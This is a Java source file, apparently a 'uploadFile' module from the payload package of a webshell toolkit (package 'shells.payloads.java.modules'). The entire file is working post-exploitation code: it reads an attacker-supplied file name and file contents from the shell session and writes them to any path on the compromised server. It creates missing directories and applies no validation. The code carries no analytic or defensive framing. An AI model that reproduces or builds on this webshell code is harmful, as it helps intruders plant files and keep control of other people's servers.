package shells.payloads.java.modules;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Map;

public class FileUploadModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }

    private byte[] getBytes(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        return value instanceof byte[] ? (byte[]) value : null;
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String fileName = getString("fileName");
            byte[] fileData = getBytes("fileValue");
            
            if (fileName != null && fileData != null) {
                File file = new File(fileName);
                File parentDir = file.getParentFile();
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }
                
                // JDK 1.6: no try-with-resources.
                FileOutputStream fos = null;
                try {
                    fos = new FileOutputStream(file);
                    fos.write(fileData);
                } finally {
                    if (fos != null) { try { fos.close(); } catch (Exception ignored) {} }
                }
                
                return "ok".getBytes();
            }
            return "Missing fileName or fileValue".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    public String getModuleName() {
        return "uploadFile";
    }
}
